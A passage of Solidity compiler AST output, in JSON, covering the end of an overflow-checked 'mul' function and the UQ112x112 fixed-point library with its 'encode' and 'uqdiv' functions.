																"src": "568:6:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "||",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 2292,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 2290,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"id": 2287,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 2283,
																					"name": "z",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2277,
																					"src": "579:1:7",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					},
																					"id": 2286,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 2284,
																						"name": "x",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 2272,
																						"src": "583:1:7",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "*",
																					"rightExpression": {
																						"argumentTypes": null,
																						"id": 2285,
																						"name": "y",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 2274,
																						"src": "587:1:7",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"src": "583:5:7",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "579:9:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 2288,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "578:11:7",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 2289,
																		"name": "y",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2274,
																		"src": "592:1:7",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "578:15:7",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 2291,
																	"name": "x",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2272,
																	"src": "597:1:7",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "578:20:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "568:30:7",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "64732d6d6174682d6d756c2d6f766572666c6f77",
															"id": 2294,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "600:22:7",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_25a0ef6406c6af6852555433653ce478274cd9f03a5dec44d001868a76b3bfdd",
																"typeString": "literal_string \"ds-math-mul-overflow\""
															},
															"value": "ds-math-mul-overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_25a0ef6406c6af6852555433653ce478274cd9f03a5dec44d001868a76b3bfdd",
																"typeString": "literal_string \"ds-math-mul-overflow\""
															}
														],
														"id": 2279,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "560:7:7",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 2295,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "560:63:7",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2296,
												"nodeType": "ExpressionStatement",
												"src": "560:63:7"
											}
										]
									},
									"documentation": null,
									"id": 2298,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2275,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2272,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2298,
												"src": "494:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2271,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "494:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2274,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2298,
												"src": "505:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2273,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "505:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "493:22:7"
									},
									"returnParameters": {
										"id": 2278,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2277,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2298,
												"src": "539:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2276,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "539:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "538:11:7"
									},
									"scope": 2299,
									"src": "481:149:7",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								}
							],
							"scope": 2300,
							"src": "175:457:7"
						}
					],
					"src": "36:597:7"
				},
				"id": 7
			},
			"UQ112x112.sol": {
				"ast": {
					"absolutePath": "UQ112x112.sol",
					"exportedSymbols": {
						"UQ112x112": [
							2341
						]
					},
					"id": 2342,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 2301,
							"literals": [
								"solidity",
								"=",
								"0.5",
								".16"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:8"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": null,
							"fullyImplemented": true,
							"id": 2341,
							"linearizedBaseContracts": [
								2341
							],
							"name": "UQ112x112",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": true,
									"id": 2306,
									"name": "Q112",
									"nodeType": "VariableDeclaration",
									"scope": 2341,
									"src": "243:32:8",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint224",
										"typeString": "uint224"
									},
									"typeName": {
										"id": 2302,
										"name": "uint224",
										"nodeType": "ElementaryTypeName",
										"src": "243:7:8",
										"typeDescriptions": {
											"typeIdentifier": "t_uint224",
											"typeString": "uint224"
										}
									},
									"value": {
										"argumentTypes": null,
										"commonType": {
											"typeIdentifier": "t_rational_5192296858534827628530496329220096_by_1",
											"typeString": "int_const 5192...(26 digits omitted)...0096"
										},
										"id": 2305,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"lValueRequested": false,
										"leftExpression": {
											"argumentTypes": null,
											"hexValue": "32",
											"id": 2303,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"kind": "number",
											"lValueRequested": false,
											"nodeType": "Literal",
											"src": "267:1:8",
											"subdenomination": null,
											"typeDescriptions": {
												"typeIdentifier": "t_rational_2_by_1",
												"typeString": "int_const 2"
											},
											"value": "2"
										},
										"nodeType": "BinaryOperation",
										"operator": "**",
										"rightExpression": {
											"argumentTypes": null,
											"hexValue": "313132",
											"id": 2304,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"kind": "number",
											"lValueRequested": false,
											"nodeType": "Literal",
											"src": "272:3:8",
											"subdenomination": null,
											"typeDescriptions": {
												"typeIdentifier": "t_rational_112_by_1",
												"typeString": "int_const 112"
											},
											"value": "112"
										},
										"src": "267:8:8",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_5192296858534827628530496329220096_by_1",
											"typeString": "int_const 5192...(26 digits omitted)...0096"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2321,
										"nodeType": "Block",
										"src": "382:57:8",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 2319,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 2313,
														"name": "z",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2311,
														"src": "392:1:8",
														"typeDescriptions": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														},
														"id": 2318,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 2315,
																	"name": "y",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2308,
																	"src": "404:1:8",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"id": 2314,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "396:7:8",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_uint224_$",
																	"typeString": "type(uint224)"
																},
																"typeName": "uint224"
															},
															"id": 2316,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "396:10:8",
															"typeDescriptions": {
																"typeIdentifier": "t_uint224",
																"typeString": "uint224"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "*",
														"rightExpression": {
															"argumentTypes": null,
															"id": 2317,
															"name": "Q112",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2306,
															"src": "409:4:8",
															"typeDescriptions": {
																"typeIdentifier": "t_uint224",
																"typeString": "uint224"
															}
														},
														"src": "396:17:8",
														"typeDescriptions": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														}
													},
													"src": "392:21:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"id": 2320,
												"nodeType": "ExpressionStatement",
												"src": "392:21:8"
											}
										]
									},
									"documentation": null,
									"id": 2322,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "encode",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2309,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2308,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2322,
												"src": "337:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 2307,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "337:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "336:11:8"
									},
									"returnParameters": {
										"id": 2312,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2311,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2322,
												"src": "371:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint224",
													"typeString": "uint224"
												},
												"typeName": {
													"id": 2310,
													"name": "uint224",
													"nodeType": "ElementaryTypeName",
													"src": "371:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "370:11:8"
									},
									"scope": 2341,
									"src": "321:118:8",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2339,
										"nodeType": "Block",
										"src": "578:35:8",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 2337,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 2331,
														"name": "z",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2329,
														"src": "588:1:8",
														"typeDescriptions": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														},
														"id": 2336,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 2332,
															"name": "x",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2324,
															"src": "592:1:8",
															"typeDescriptions": {
																"typeIdentifier": "t_uint224",
																"typeString": "uint224"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 2334,
																	"name": "y",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2326,
																	"src": "604:1:8",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"id": 2333,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "596:7:8",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_uint224_$",
																	"typeString": "type(uint224)"
																},
																"typeName": "uint224"
															},
															"id": 2335,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "596:10:8",
															"typeDescriptions": {
																"typeIdentifier": "t_uint224",
																"typeString": "uint224"
															}
														},
														"src": "592:14:8",
														"typeDescriptions": {
															"typeIdentifier": "t_uint224",
															"typeString": "uint224"
														}
													},
													"src": "588:18:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"id": 2338,
												"nodeType": "ExpressionStatement",
												"src": "588:18:8"
											}
										]
									},
									"documentation": null,
									"id": 2340,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "uqdiv",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2327,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2324,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2340,
												"src": "522:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint224",
													"typeString": "uint224"
												},
												"typeName": {
													"id": 2323,
													"name": "uint224",
													"nodeType": "ElementaryTypeName",
													"src": "522:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2326,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2340,
												"src": "533:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 2325,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "533:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "521:22:8"
									},
									"returnParameters": {
										"id": 2330,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2329,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2340,
												"src": "567:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint224",
													"typeString": "uint224"
												},
												"typeName": {
													"id": 2328,
													"name": "uint224",
													"nodeType": "ElementaryTypeName",
													"src": "567:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint224",
														"typeString": "uint224"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "566:11:8"
									},
									"scope": 2341,
									"src": "507:106:8",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								}
							],
							"scope": 2342,
							"src": "219:396:8"
						}
					],
					"src": "36:580:8"
				},
				"id": 8
			}
		}
	}
}